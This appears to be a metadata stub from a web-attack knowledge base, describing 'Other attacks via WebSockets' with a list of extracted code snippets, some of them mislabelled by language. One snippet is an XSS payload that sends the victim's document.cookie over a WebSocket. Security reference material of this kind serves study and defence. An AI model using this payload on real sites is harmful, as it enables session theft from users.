---
technique: "Other attacks via WebSockets"
family: "client-side"
severity_hint: "medium"
tags: []
source: "_raw/Web attacks/Web Attacks/WebSocket Attacks/Other attacks via WebSockets.md"
source_sha256: "ffbccce8c5119e4c4dc32a52383a593e2f8cb2ef996541d74c18cef315922e79"
curator_version: 2
...
- `bash: <img/src/onerror="socket.send(document.cookie)">`
- `python: from flask import Flask, request`
- `python: @sock.route('/messages')`
- `python: GET /messages HTTP/1.1`
- `jsx: <script>`
...
## Source
Original note: `_raw/Web attacks/Web Attacks/WebSocket Attacks/Other attacks via WebSockets.md`
